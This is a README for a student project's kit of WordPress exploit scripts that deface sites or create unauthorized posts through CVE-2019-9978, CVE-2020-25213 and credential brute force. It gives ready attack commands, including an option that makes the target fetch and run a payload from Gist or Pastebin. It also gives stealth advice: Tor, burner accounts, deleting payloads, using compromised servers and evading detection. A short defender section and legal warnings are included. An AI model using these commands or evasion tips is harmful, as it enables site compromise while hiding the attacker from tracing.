# WordPress Exploits Directory

This directory contains exploitation scripts and comprehensive documentation for WordPress vulnerabilities used in the DevSecOps project.

## ğŸ“ Directory Structure

```
exploits/
â”œâ”€â”€ cve-2019-9978-deface.py              # Social Warfare RCE â†’ Website defacement
â”œâ”€â”€ cve-2019-9978-post.py                # Social Warfare RCE â†’ Unauthorized posts
â”œâ”€â”€ cve-2020-25213-deface.py             # File Manager RCE â†’ Website defacement
â”œâ”€â”€ cve-2020-25213-post.py               # File Manager RCE â†’ Unauthorized posts
â”œâ”€â”€ weak-credentials-deface.py           # Brute force â†’ Website defacement
â”œâ”€â”€ weak-credentials-post.py             # Brute force â†’ Unauthorized posts
â”‚
â”œâ”€â”€ DEFACEMENT_EXPLOITS_EXPLAINED.md     # ğŸ“š Complete technical analysis
â”œâ”€â”€ PAYLOAD_AND_RESTORATION_GUIDE.md     # ğŸ“š Payload & restoration guide
â”œâ”€â”€ QUICK_REFERENCE.md                   # ğŸ“š Command cheat sheet
â”œâ”€â”€ UPDATE_SUMMARY.md                    # ğŸ“š Version 2.0 changes summary
â”œâ”€â”€ README.md                            # ğŸ“š This file
â”‚
â””â”€â”€ sample-payloads/                     # Sample files for external hosting
    â”œâ”€â”€ external-deface-payload.txt      # Sample defacement payload
    â”œâ”€â”€ external-restore-payload.txt     # Sample restoration payload
    â””â”€â”€ README.md                        # Sample payloads guide
```

---

## ğŸ¯ Exploit Scripts

### Website Defacement Scripts (NEW v2.0!)

| Script | CVE | Features | Restoration |
|--------|-----|----------|-------------|
| `cve-2019-9978-deface.py` | CVE-2019-9978 | External payload support, Auto-restore | âœ… `--restore` |
| `cve-2020-25213-deface.py` | CVE-2020-25213 | File upload RCE, Auto-restore | âœ… `--restore` |
| `weak-credentials-deface.py` | N/A | Brute force + theme modification | âœ… `--restore` |

### Unauthorized Content Scripts

| Script | CVE | Attack Type |
|--------|-----|-------------|
| `cve-2019-9978-post.py` | CVE-2019-9978 | Create malicious posts via RCE |
| `cve-2020-25213-post.py` | CVE-2020-25213 | Create malicious posts via file upload |
| `weak-credentials-post.py` | N/A | Create malicious posts via admin access |

---

## ğŸš€ Quick Start

### Basic Defacement (Default)

```bash
# CVE-2019-9978: Social Warfare RCE
python3 cve-2019-9978-deface.py http://wordpress.tujuh

# CVE-2020-25213: File Manager RCE
python3 cve-2020-25213-deface.py http://wordpress.tujuh

# Weak Credentials: Brute force
python3 weak-credentials-deface.py http://wordpress.tujuh
```

### Stealth Defacement (External Payload) - NEW!

```bash
# 1. Upload payload to GitHub Gist
# 2. Get raw URL
# 3. Run exploit

python3 cve-2019-9978-deface.py http://wordpress.tujuh \
  --external-payload https://gist.githubusercontent.com/user/id/raw/payload.txt
```

### Automated Restoration - NEW!

```bash
# Restore from backup (created during defacement)
python3 cve-2019-9978-deface.py http://wordpress.tujuh --restore
python3 cve-2020-25213-deface.py http://wordpress.tujuh --restore
python3 weak-credentials-deface.py http://wordpress.tujuh --restore
```

---

## ğŸ“š Documentation

### Essential Reading

1. **[DEFACEMENT_EXPLOITS_EXPLAINED.md](DEFACEMENT_EXPLOITS_EXPLAINED.md)** (Must Read!)
   - Complete technical analysis of both CVEs
   - Attack flow diagrams and step-by-step breakdowns
   - Business impact and real-world consequences
   - Detection and prevention strategies
   - **Read this first to understand how exploits work**

2. **[PAYLOAD_AND_RESTORATION_GUIDE.md](PAYLOAD_AND_RESTORATION_GUIDE.md)**
   - Using external payloads (GitHub Gist, Pastebin)
   - Automated vs manual restoration procedures
   - Complete examples and troubleshooting
   - **Read this for advanced usage**

3. **[QUICK_REFERENCE.md](QUICK_REFERENCE.md)**
   - Command cheat sheet
   - Common usage examples
   - Quick lookup for common tasks
   - **Read this for quick reference**

4. **[UPDATE_SUMMARY.md](UPDATE_SUMMARY.md)**
   - Version 2.0 changelog
   - New features overview
   - Migration guide from v1.0
   - **Read this to see what's new**

5. **[sample-payloads/README.md](sample-payloads/README.md)**
   - Sample payload files for external hosting
   - How to customize payloads
   - Security considerations
   - **Read this for payload templates**

---

## ğŸ†• What's New in v2.0

### Major Features Added (November 4, 2025)

âœ… **External Payload Support** (CVE-2019-9978)
- Use GitHub Gist, Pastebin, or custom servers
- No local HTTP server needed
- Works behind NAT/firewall
- More stealthy operation

âœ… **Automated Restoration** (All Scripts)
- `--restore` flag for one-command restoration
- Automatic backup cleanup
- Verifies restoration success

âœ… **Comprehensive Documentation**
- 65,000+ words of documentation
- Complete technical analysis
- Real-world examples
- Troubleshooting guides

âœ… **Sample Payloads**
- Ready-to-use payload templates
- External hosting examples
- Customization guides

---

## ğŸ’¡ Usage Examples

### Example 1: Quick Test

```bash
# Deface using embedded payload
python3 cve-2019-9978-deface.py http://wordpress.tujuh

# Verify defacement
curl http://wordpress.tujuh | grep "DEFACED"

# Restore
python3 cve-2019-9978-deface.py http://wordpress.tujuh --restore

# Verify restoration
curl http://wordpress.tujuh | grep "<?php"
```

### Example 2: Stealth Attack

```bash
# 1. Create GitHub Gist with payload from sample-payloads/
# 2. Get raw URL
# 3. Execute

python3 cve-2019-9978-deface.py http://wordpress.tujuh \
  --external-payload https://gist.githubusercontent.com/anon/abc/raw/payload.txt

# Target fetches from Gist (not your IP)
# More difficult to trace
```

### Example 3: Behind Firewall

```bash
# Your machine is behind firewall/NAT
# Target can't reach you directly
# Solution: Use external payload

# Upload payload to Pastebin
# Get raw URL: https://pastebin.com/raw/XYZ789

python3 cve-2019-9978-deface.py http://wordpress.tujuh \
  --external-payload https://pastebin.com/raw/XYZ789
```

### Example 4: Testing Sequence

```bash
# Full test: Deface â†’ Verify â†’ Restore â†’ Verify

# 1. Deface
python3 cve-2020-25213-deface.py http://wordpress.tujuh

# 2. Verify defacement
curl http://wordpress.tujuh | head -20

# 3. Restore
python3 cve-2020-25213-deface.py http://wordpress.tujuh --restore

# 4. Verify restoration
curl http://wordpress.tujuh | head -20
```

---

## ğŸ”§ Command Reference

### CVE-2019-9978 (Social Warfare)

```bash
# Basic usage (embedded payload)
python3 cve-2019-9978-deface.py TARGET

# Custom port for local server
python3 cve-2019-9978-deface.py TARGET --port 9000

# External payload (GitHub Gist)
python3 cve-2019-9978-deface.py TARGET --external-payload URL

# Restore from backup
python3 cve-2019-9978-deface.py TARGET --restore

# Restore with external payload
python3 cve-2019-9978-deface.py TARGET --restore --external-payload URL

# Show help
python3 cve-2019-9978-deface.py --help
```

### CVE-2020-25213 (File Manager)

```bash
# Basic usage (upload backdoor)
python3 cve-2020-25213-deface.py TARGET

# Restore from backup
python3 cve-2020-25213-deface.py TARGET --restore

# Show help
python3 cve-2020-25213-deface.py --help
```

### Weak Credentials

```bash
# Basic usage (brute force)
python3 weak-credentials-deface.py TARGET

# Restore from backup
python3 weak-credentials-deface.py TARGET --restore

# Show help
python3 weak-credentials-deface.py --help
```

---

## ğŸ›¡ï¸ Security Notes

### For Red Team / Penetration Testers

**Best Practices:**
1. âœ… Always get written authorization
2. âœ… Test in isolated lab environment first
3. âœ… Use external payloads for stealth
4. âœ… Clean up with `--restore` after testing
5. âœ… Delete external payloads after use
6. âœ… Document all findings

**Stealth Techniques:**
- Use Tor/VPN when uploading payloads
- Use burner accounts for Gist/Pastebin
- Set short expiration times on pastes
- Delete payloads immediately after exploitation
- Consider using compromised servers (with permission)

### For Blue Team / Defenders

**Detection Indicators:**
- Outbound connections to paste services (gist.githubusercontent.com, pastebin.com)
- Theme file modifications (index.php)
- Backup files in theme directories (*.bak)
- PHP files in wp-file-manager/lib/files/ directory
- Social Warfare debug mode access logs

**Prevention:**
- Update plugins immediately
- Remove unused/vulnerable plugins
- Implement file integrity monitoring
- Use Web Application Firewall (WAF)
- Monitor egress connections
- Regular security audits

---

## ğŸ“Š Vulnerability Matrix

| Vulnerability | CVSS | Auth Required | Impact | Exploits |
|---------------|------|---------------|---------|----------|
| CVE-2019-9978 | 9.8 Critical | âŒ No | Complete RCE | 2 scripts |
| CVE-2020-25213 | 10.0 Critical | âŒ No | Complete RCE | 2 scripts |
| Weak Credentials | 8.5 High | âŒ No | Admin Access | 2 scripts |

**Total Exploits:** 6 scripts (3 defacement + 3 unauthorized posts)

---

## ğŸ“ Learning Path

### Beginner
1. Read DEFACEMENT_EXPLOITS_EXPLAINED.md
2. Set up local WordPress test environment
3. Run basic deface scripts
4. Practice restoration
5. Understand attack flow

### Intermediate
1. Read PAYLOAD_AND_RESTORATION_GUIDE.md
2. Create custom payloads
3. Upload to GitHub Gist
4. Test external payload mode
5. Understand detection methods

### Advanced
1. Modify payload HTML
2. Set up own payload server
3. Create obfuscated payloads
4. Implement detection evasion
5. Contribute improvements

---

## âš ï¸ Legal Warning

**IMPORTANT: These tools are for authorized security testing ONLY.**

**Authorized Use:**
- âœ… Your own systems
- âœ… Client-authorized penetration testing (written permission)
- âœ… Bug bounty programs (within scope)
- âœ… Controlled lab/training environments
- âœ… Security research (with permission)

**Unauthorized Use is ILLEGAL:**
- âŒ Testing without permission
- âŒ Actual malicious defacement
- âŒ Attacking systems you don't own
- âŒ Using for criminal purposes

**Legal Consequences:**
- Criminal charges (Computer Fraud and Abuse Act, GDPR violations, etc.)
- Civil lawsuits from affected parties
- Imprisonment (up to 20+ years depending on jurisdiction)
- Heavy fines ($100,000 to millions)
- Permanent criminal record

**Always obtain written permission before testing any system.**

---

## ğŸ› Troubleshooting

### Common Issues

**Issue: "External payload not accessible"**
```bash
# Solution: Verify URL returns raw text
curl -v https://gist.githubusercontent.com/user/id/raw/file.txt
# Should return raw PHP code, not HTML
```

**Issue: "Backup file not found"**
```bash
# Solution: Backup only created during defacement
# Run deface first, then restore
python3 cve-2019-9978-deface.py http://target.com        # Creates backup
python3 cve-2019-9978-deface.py http://target.com --restore  # Uses backup
```

**Issue: "Permission denied"**
```bash
# Solution: Check file permissions on server
ssh user@server
ls -la /var/www/html/wp-content/themes/*/index.php
# Should be writable by www-data user
```

**Issue: "Connection timeout"**
```bash
# Solution: Check firewall, target accessibility
ping wordpress.tujuh
curl -v http://wordpress.tujuh
```

---

## ğŸ“ Support

### Getting Help

1. **Check Documentation:**
   - Read DEFACEMENT_EXPLOITS_EXPLAINED.md
   - Check PAYLOAD_AND_RESTORATION_GUIDE.md
   - Review QUICK_REFERENCE.md

2. **Review Examples:**
   - Look at sample-payloads/ directory
   - Check usage examples in this README
   - Review troubleshooting section

3. **Test Locally:**
   - Set up local WordPress
   - Test in safe environment
   - Debug with verbose output

---

## ğŸ”® Future Development

### Planned Features
- [ ] Database backup/restore
- [ ] Multiple theme targets
- [ ] Payload obfuscation
- [ ] Encrypted payloads
- [ ] Automatic scanning for vulnerabilities
- [ ] GUI interface for exploits
- [ ] Report generation

### Contributing
Contributions are welcome! Please:
- Test thoroughly before submitting
- Document all changes
- Follow existing code style
- Update documentation
- Add examples for new features

---

## ğŸ“ Changelog

### Version 2.0 (November 4, 2025)
- âœ… Added external payload support (CVE-2019-9978)
- âœ… Added automated restoration (all scripts)
- âœ… Created comprehensive documentation (65,000+ words)
- âœ… Added sample payload templates
- âœ… Improved error handling and user experience
- âœ… Enhanced help messages and examples

### Version 1.0 (Original)
- âœ… Basic defacement functionality
- âœ… Unauthorized post creation
- âœ… Embedded payloads only
- âœ… Manual restoration required

---

## ğŸ“„ License

This project is for **educational purposes only**. Use at your own risk and only on systems you own or have explicit written permission to test.

---

## ğŸ™ Acknowledgments

- WordPress Security Team for vulnerability disclosures
- Original CVE researchers and reporters
- Security community for responsible disclosure practices
- OWASP for web security guidelines

---

**Last Updated:** November 4, 2025  
**Version:** 2.0  
**Maintainer:** DevSecOps Team  
**Project:** Kelompok Tujuh - WordPress Vulnerability Demonstration
